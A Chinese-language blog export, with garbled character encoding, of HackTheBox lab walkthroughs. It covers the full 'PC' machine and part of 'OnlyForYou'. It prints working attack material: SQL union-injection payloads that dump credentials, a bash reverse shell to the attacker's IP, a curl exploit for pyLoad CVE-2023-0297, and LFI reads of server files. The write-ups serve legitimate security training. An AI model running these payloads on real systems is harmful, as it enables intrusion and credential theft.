    <content><![CDATA[<h1 id="HTB-PC"><a href="#HTB-PC" class="headerlink" title="HTB-PC"></a>HTB-PC</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><p>1.ç«¯å£æ‰«æå‘ç°<code>gRPC</code>æœåŠ¡ï¼›</p>
<p>2.<code>gRPC</code>å­˜åœ¨SQLæ³¨å…¥è·å–åˆ°SSHè´¦æˆ·ï¼›</p>
<p>3.SSHè¿æ¥æŸ¥çœ‹ä¸»æœºç«¯å£æœåŠ¡å‘ç°pyLoadæœåŠ¡ï¼›</p>
<p>4.pyLoadæœåŠ¡å­˜åœ¨RCEï¼ˆCVE-2023-0297ï¼‰åå¼¹shellè·å–rootæƒé™ã€‚</p>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«æç«¯å£æœåŠ¡</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -p- --min-rate 10000 -Pn -sT 10.10.11.214<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911090358901.png"></p>
<p>éå¸¸è§„ç«¯å£50051ï¼Œç›´æ¥æµè§ˆå™¨è®¿é—®æ˜¯ä¹±ç ï¼Œgoogleå‘ç°æ˜¯gRPCé»˜è®¤ç«¯å£</p>
<p>googleå…³é”®å­—ï¼šgRPC exploit</p>
<p><a href="https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9">https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9</a></p>
<p>æ–‡ç« å¤§è‡´æ„æ€æ˜¯ï¼Œæœ‰ä¸€ä¸ªSQLæ³¨å…¥</p>
<p>å·¥å…·ï¼š</p>
<p>grpcurlï¼š<a href="https://github.com/fullstorydev/grpcurl">https://github.com/fullstorydev/grpcurl</a></p>
<p>grpcuiï¼š<a href="https://github.com/fullstorydev/grpcui">https://github.com/fullstorydev/grpcui</a></p>
<p>ç”¨grpcurlå¯ä»¥æŸ¥çœ‹ä¸€äº›åŸºæœ¬æœåŠ¡ï¼ŒSimpleAppå¯¹åº”æœ‰LoginUserã€RegisterUserã€getInfoä¸‰ä¸ªæ¥å£æ–¹æ³•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911144549961.png"></p>
<p>ç”¨grpcuiå·¥å…·ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå®ç°ä¸gRPCæœåŠ¡äº¤äº’</p>
<pre class="line-numbers language-none"><code class="language-none">./grpcui -plaintext 10.10.11.214:50051<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911094910083.png"></p>
<p>è‡ªåŠ¨æ‰“å¼€å¦‚ä¸‹webé¡µé¢ï¼Œç„¶åæ‰“å¼€Burpsuiteï¼Œæ•è·ä¸‹é¢çš„æ“ä½œè¿‡ç¨‹ï¼Œæ–¹ä¾¿æµ‹è¯•SQLæ³¨å…¥</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911094929531.png" style="zoom: 80%;">

<p>åœ¨LoginUseræ¥å£ï¼Œå¼±å£ä»¤<code>admin:admin</code>æˆåŠŸè®¤è¯ï¼ˆä¸‹é¢çš„è®¤è¯è·¯å¾„æ˜¯é€šè¿‡è§‚å¯Ÿå“åº”çš„messageï¼Œå°è¯•å‡ºæ¥çš„æ­£ç¡®è®¤è¯è¿‡ç¨‹ï¼‰</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911101136655.png" style="zoom:67%;">

<p>å¾—åˆ°ä¸€ä¸ª<code>id</code>å’Œ<code>token</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911101234993.png"></p>
<pre class="line-numbers language-none"><code class="language-none">525
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2OTQ0MDgzMjB9.SH7DanchqAh3QMbI2q8VTH9X1qKX438MtNA8Ixr9TNU<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ç„¶ååˆ°getInfoæ¥å£ï¼Œ<code>Request Metadata</code>å¡«å…¥å¯¹åº”çš„tokené”®å€¼å¯¹ï¼Œ<code>Request Data</code>å¡«å…¥idå€¼</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911101448304.png" style="zoom:67%;">

<p>ç‚¹å‡»<code>Invoke</code>ä¹‹åï¼Œå“åº”ä¹Ÿæ˜¯æˆåŠŸçš„å“åº”</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911101534641.png" style="zoom:67%;">

<h2 id="ä¸‰ã€gRPC-SQLæ³¨å…¥"><a href="#ä¸‰ã€gRPC-SQLæ³¨å…¥" class="headerlink" title="ä¸‰ã€gRPC SQLæ³¨å…¥"></a>ä¸‰ã€gRPC SQLæ³¨å…¥</h2><p>åœ¨æœ€ågetInfoçš„æ•°æ®åŒ…ä¸­ï¼Œidéƒ¨åˆ†å¯èƒ½å­˜åœ¨æ³¨å…¥ï¼Œå› ä¸ºåŠ å•å¼•å·ä¼šæœ‰æŠ¥é”™æç¤º</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911101722079.png"></p>
<p>æŠŠè¯·æ±‚åŒ…ä¿å­˜ä¸ºsqltestæ–‡ä»¶ï¼Œsqlmapæ³¨å…¥ï¼Œç¬”è€…æ­¤å¤„sqlmapè·‘ä¸å‡ºï¼Œæ‰‹å·¥å¯ä»¥æ³¨å‡ºæ•°æ®</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -r sqltest -p id -f --batch --dump-all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911113458186.png"></p>
<p>æ‰‹å·¥ï¼ˆæ³¨æ„unionå‰idæ”¹ä¸ºä¸€ä¸ªé”™è¯¯idï¼‰ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">"id":"520 union select sqlite_version(); --+"
#è¡¨åï¼Œæ•°æ®åº“å
"id":"520 union select group_concat(sql) from sqlite_master --+"
#usernameçš„å€¼
"id":"520 union select group_concat(username) from accounts --+"
#password
"id":"520 union select group_concat(password) from accounts --+"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911113618817.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911113722594.png"></p>
<p>æ–°æ‰¾åˆ°ä¸€ä¸ªç”¨æˆ·</p>
<pre class="line-numbers language-none"><code class="language-none">sau : HereIsYourPassWord1431<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>SSHè¿æ¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911131423418.png"></p>
<p><code>netstat -antp</code>æŸ¥çœ‹ç«¯å£å¼€æ”¾æƒ…å†µï¼Œæœ‰9666ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œä½†è®¿é—®ä¸åˆ°ï¼Œé‚£å°±å°è¯•æŠŠå¯¹å†…å¼€æ”¾çš„8000ç«¯å£åšç«¯å£è½¬å‘</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911132149615.png"></p>
<p><strong>ä»æœ¬åœ°ä¸‹è½½chisel</strong></p>
<p>æœ¬åœ°kaliæ‰§è¡Œ</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç›®æ ‡é¶æœºæ‰§è¡Œ</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.8/chisel
chmod +x chisel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>å»ºç«‹ç«¯å£è½¬å‘</strong></p>
<p>æœ¬åœ°kaliæ‰§è¡Œ</p>
<pre class="line-numbers language-none"><code class="language-none">./chisel server --port 9898 --reverse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911135711025.png"></p>
<p>ç›®æ ‡é¶æœºæ‰§è¡Œ</p>
<pre class="line-numbers language-none"><code class="language-none">./chisel client -v 10.10.14.8:9898 R:8000:127.0.0.1:8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911135819475.png"></p>
<p>æœ¬åœ°æµè§ˆå™¨è®¿é—®<code>127.0.0.1:8000</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911135858947.png" style="zoom:67%;">

<h2 id="å››ã€pyLoad-RCEï¼ˆCVE-2023-0297ï¼‰"><a href="#å››ã€pyLoad-RCEï¼ˆCVE-2023-0297ï¼‰" class="headerlink" title="å››ã€pyLoad RCEï¼ˆCVE-2023-0297ï¼‰"></a>å››ã€pyLoad RCEï¼ˆCVE-2023-0297ï¼‰</h2><p>googleå…³é”®è¯ï¼špyload exploit</p>
<p><a href="https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad">https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad</a></p>
<p>åœ¨ç›®æ ‡é¶æœº<code>/tmp</code>ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª<code>shell.sh</code>ï¼Œå†™å…¥å¦‚ä¸‹åå¼¹shellè„šæœ¬</p>
<pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/10.10.14.8/9899 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æœ¬åœ°kaliå¼€å¯ç›‘å¬<code>nc -lvnp 9899</code></p>
<p>é¶æœºæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"bash%20/tmp/shell.sh\");f=function%20f2(){};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>æˆåŠŸè·å–rootæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911142716278.png"></p>
<p>Overï¼</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911143053192.png" style="zoom:67%;">]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>gRPCæœåŠ¡</tag>
        <tag>CVE-2023-0297ï¼ˆpyLoadæœåŠ¡RCEï¼‰</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-OnlyForYou</title>
    <url>/posts/5cae8651.html</url>
    <content><![CDATA[<h1 id="HTB-OnlyForYou"><a href="#HTB-OnlyForYou" class="headerlink" title="HTB-OnlyForYou"></a>HTB-OnlyForYou</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><p>1.ä¿¡æ¯æ”¶é›†æ‰¾åˆ°åŸŸåå’Œå­åŸŸï¼›</p>
<p>2.å­åŸŸæºç å®¡è®¡è·¯ç”±å‘ç°LFIï¼›</p>
<p>3.LFIè¯»å–Nginxé…ç½®æ–‡ä»¶åŠä¸»ç«™æºç ï¼›</p>
<p>4.ä¸»ç«™æºç å®¡è®¡å‘ç°RCEï¼›</p>
<p>5.RCEåå¼¹shellè·å–www-dataæƒé™ï¼›</p>
<p>6.æŸ¥çœ‹ç«¯å£æœåŠ¡å‘ç°Neo4jæœåŠ¡ï¼›</p>
<p>7.Neo4jæ³¨å…¥è·å¾—sshè´¦æˆ·å¯†ç ï¼›</p>
<p>8.pip downloadä»£ç æ‰§è¡Œå®ç°suidææƒã€‚</p>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«æç«¯å£æœåŠ¡</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829093603726.png"></p>
<p>å‘ç°åŸŸåï¼Œå†™å…¥æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.210 only4you.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æµè§ˆå™¨æ‰“å¼€ï¼Œé¦–é¡µå¦‚ä¸‹</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829102935229.png" style="zoom: 67%;">

<p>æ‰«æå­åŸŸ</p>
<pre class="line-numbers language-none"><code class="language-none">gobuster vhost -u http://only4you.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829102827329.png"></p>
<p>å‘ç°ä¸€ä¸ªå­åŸŸï¼Œæ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.210 beta.only4you.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è®¿é—®å­åŸŸ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829103600051.png"></p>
<h2 id="ä¸‰ã€LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰"><a href="#ä¸‰ã€LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰" class="headerlink" title="ä¸‰ã€LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰"></a>ä¸‰ã€LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰</h2><p>ç‚¹å‡»<code>Source Code</code>ï¼Œä¼šä¸‹è½½æºç ã€‚å®¡è®¡å‘ç°<code>app.py</code>çš„<code>/download</code>è·¯ç”±ï¼Œifæ¡ä»¶ç”¨ç»å¯¹è·¯å¾„å³å¯ç»•è¿‡ï¼ŒPOSTæäº¤çš„<code>image</code>å‚æ•°æœ€ç»ˆä¼ é€’ç»™<code>send_file()</code>å‡½æ•°ï¼Œå®ç°LFIï¼Œåªéœ€çŸ¥é“æ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œå³å¯è¯»å–ä»»æ„æ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829125830300.png"></p>
<p>nmapæ‰«æç»“æœå¯çœ‹å‡ºæ˜¯NginxæœåŠ¡ï¼Œå°è¯•è¯»å–Nginxç›¸å…³é…ç½®æ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">Nginxä¸»é…ç½®æ–‡ä»¶é»˜è®¤è·¯å¾„ï¼š
/etc/nginx/nginx.conf
è™šæ‹Ÿä¸»æœºé»˜è®¤é…ç½®æ–‡ä»¶ï¼š
/etc/nginx/sites-available/default
/etc/nginx/sites-enabled/default<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>BurpæŠ“åŒ…ï¼ŒPOSTè®¿é—®<code>/download</code>ç›®å½•ï¼Œæäº¤imageå‚æ•°ï¼Œç„¶ååœ¨è™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶å‘ç°webç›®å½•æ˜¯<code>/var/www/only4you.htb/</code>ï¼ˆä¸»ç«™ï¼‰å’Œ<code>/var/www/beta.only4you.htb/</code>ï¼ˆå­åŸŸï¼‰</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829130645516.png"></p>
<p>å­åŸŸä¸‹æºç æœ‰<code>app.py</code>ï¼Œä»¥ç»éªŒæ¥çœ‹ï¼Œé€šå¸¸ä¸»ç«™ä¸‹åº”è¯¥ä¹Ÿæœ‰<code>app.py</code>ï¼Œå°è¯•è¯»å–ç¡®å®å­˜åœ¨</p>
<pre class="line-numbers language-none"><code class="language-none">/var/www/only4you.htb/app.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829130958523.png"></p>
<p>å®Œæ•´ä»£ç å¦‚ä¸‹</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> redirect
<span class="token keyword">from</span> form <span class="token keyword">import</span> sendmessage
<span class="token keyword">import</span> uuid

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        email <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span>
        subject <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'subject'</span><span class="token punctuation">]</span>
        message <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span>
        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr

        status <span class="token operator">=</span> sendmessage<span class="token punctuation">(</span>email<span class="token punctuation">,</span> subject<span class="token punctuation">,</span> message<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>
        <span class="token keyword">if</span> status <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">'Something went wrong!'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> status <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">'You are not authorized!'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">'Your message was successfuly sent! We will reply as soon as possible.'</span><span class="token punctuation">,</span> <span class="token string">'success'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/#contact'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">page_not_found</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'404.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">404</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">server_errorerror</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'500.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">bad_request</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'400.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">405</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">method_not_allowed</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'405.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">405</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸Šé¢ä»£ç ç¬¬äºŒè¡Œä»formæ¨¡å—å¯¼å…¥äº†sendmessageæ–¹æ³•ï¼Œformä¸æ˜¯pythonå®˜æ–¹æ¨¡å—ï¼Œæ‰€ä»¥çŒœæµ‹åœ¨åŒç›®å½•ä¸‹æœ‰<code>form.py</code>ï¼Œè¯»å–å¦‚ä¸‹æ–‡ä»¶ç¡®å®å­˜åœ¨</p>
<pre class="line-numbers language-none"><code class="language-none">/var/www/only4you.htb/form.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å®Œæ•´ä»£ç å¦‚ä¸‹</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> smtplib<span class="token punctuation">,</span> re
<span class="token keyword">from</span> email<span class="token punctuation">.</span>message <span class="token keyword">import</span> EmailMessage
<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> PIPE<span class="token punctuation">,</span> run
<span class="token keyword">import</span> ipaddress

<span class="token keyword">def</span> <span class="token function">issecure</span><span class="token punctuation">(</span>email<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})"</span><span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">return</span> <span class="token number">0</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		domain <span class="token operator">=</span> email<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
		result <span class="token operator">=</span> run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"dig txt </span><span class="token interpolation"><span class="token punctuation">{</span>domain<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
		output <span class="token operator">=</span> result<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> <span class="token string">"v=spf1"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>
			<span class="token keyword">return</span> <span class="token number">1</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			domains <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
			ips <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
			<span class="token keyword">if</span> <span class="token string">"include:"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>
				dms <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"include:.*\.[A-Z|a-z]{2,}"</span><span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"include:"</span><span class="token punctuation">)</span>
				dms<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
				<span class="token keyword">for</span> domain <span class="token keyword">in</span> dms<span class="token punctuation">:</span>
					domains<span class="token punctuation">.</span>append<span class="token punctuation">(</span>domain<span class="token punctuation">)</span>
				<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
					<span class="token keyword">for</span> domain <span class="token keyword">in</span> domains<span class="token punctuation">:</span>
						result <span class="token operator">=</span> run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"dig txt </span><span class="token interpolation"><span class="token punctuation">{</span>domain<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
						output <span class="token operator">=</span> result<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
						<span class="token keyword">if</span> <span class="token string">"include:"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>
							dms <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"include:.*\.[A-Z|a-z]{2,}"</span><span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"include:"</span><span class="token punctuation">)</span>
							domains<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
							<span class="token keyword">for</span> domain <span class="token keyword">in</span> dms<span class="token punctuation">:</span>
								domains<span class="token punctuation">.</span>append<span class="token punctuation">(</span>domain<span class="token punctuation">)</span>
						<span class="token keyword">elif</span> <span class="token string">"ip4:"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>
							ipaddresses <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}"</span><span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"ip4:"</span><span class="token punctuation">)</span>
							ipaddresses<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
							<span class="token keyword">for</span> i <span class="token keyword">in</span> ipaddresses<span class="token punctuation">:</span>
								ips<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
						<span class="token keyword">else</span><span class="token punctuation">:</span>
							<span class="token keyword">pass</span>
					<span class="token keyword">break</span>
			<span class="token keyword">elif</span> <span class="token string">"ip4"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>
